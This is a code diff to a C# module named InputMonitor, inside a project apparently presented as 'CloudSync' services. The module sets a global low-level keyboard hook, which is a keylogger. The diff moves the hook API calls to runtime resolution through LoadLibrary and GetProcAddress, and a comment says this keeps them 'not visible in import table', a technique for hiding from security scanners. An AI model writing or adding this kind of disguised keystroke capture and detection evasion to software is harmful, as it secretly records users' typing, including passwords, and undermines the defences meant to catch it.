@@ -1,4 +1,4 @@
-﻿using Gma.System.MouseKeyHook;
+using Gma.System.MouseKeyHook;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -22,20 +22,42 @@ namespace CloudSync.Services.Modules
 
         public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        public static extern IntPtr SetWindowsHookEx(int hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+        // Dynamic API delegates
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        public static extern int CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        private delegate IntPtr SetWindowsHookExDelegate(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+        private delegate int CallNextHookExDelegate(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        private delegate bool UnhookWindowsHookExDelegate(IntPtr hhk);
+        private delegate IntPtr GetModuleHandleDelegate(string lpModuleName);
 
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        // Resolved function pointers
+        private static SetWindowsHookExDelegate _setHook;
+        private static CallNextHookExDelegate _callNext;
+        private static UnhookWindowsHookExDelegate _unhook;
+        private static GetModuleHandleDelegate _getModule;
 
         private static IntPtr _hookHandle = IntPtr.Zero;
         private static HookProc _hookProc;
+
+        static InputMonitor()
+        {
+            // Resolve APIs at runtime — not visible in import table
+            IntPtr u32 = LoadLibrary("user32.dll");
+            IntPtr k32 = LoadLibrary("kernel32.dll");
+
+            _setHook = Marshal.GetDelegateForFunctionPointer<SetWindowsHookExDelegate>(
+                GetProcAddress(u32, "SetWindowsHookExA"));
+            _callNext = Marshal.GetDelegateForFunctionPointer<CallNextHookExDelegate>(
+                GetProcAddress(u32, "CallNextHookEx"));
+            _unhook = Marshal.GetDelegateForFunctionPointer<UnhookWindowsHookExDelegate>(
+                GetProcAddress(u32, "UnhookWindowsHookEx"));
+            _getModule = Marshal.GetDelegateForFunctionPointer<GetModuleHandleDelegate>(
+                GetProcAddress(k32, "GetModuleHandleW"));
+        }
 
         public static void Start()
         {
@@ -46,8 +68,8 @@ namespace CloudSync.Services.Modules
                     _hookThread = new Thread(() =>
                     {
                         _hookProc = new HookProc(HookCallback);
-                        IntPtr hInstance = GetModuleHandle(null);
-                        _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, hInstance, 0);
+                        IntPtr hInstance = _getModule(null);
+                        _hookHandle = _setHook(WH_KEYBOARD_LL, _hookProc, hInstance, 0);
 
                         Application.Run();
                     });
@@ -130,12 +152,12 @@ namespace CloudSync.Services.Modules
                 }
             }
 
-            return (IntPtr)CallNextHookEx(_hookHandle, nCode, wParam, lParam);
+            return (IntPtr)_callNext(_hookHandle, nCode, wParam, lParam);
         }
 
         private static void Unhook()
         {
-            UnhookWindowsHookEx(_hookHandle);
+            _unhook(_hookHandle);
         }
     }
 }
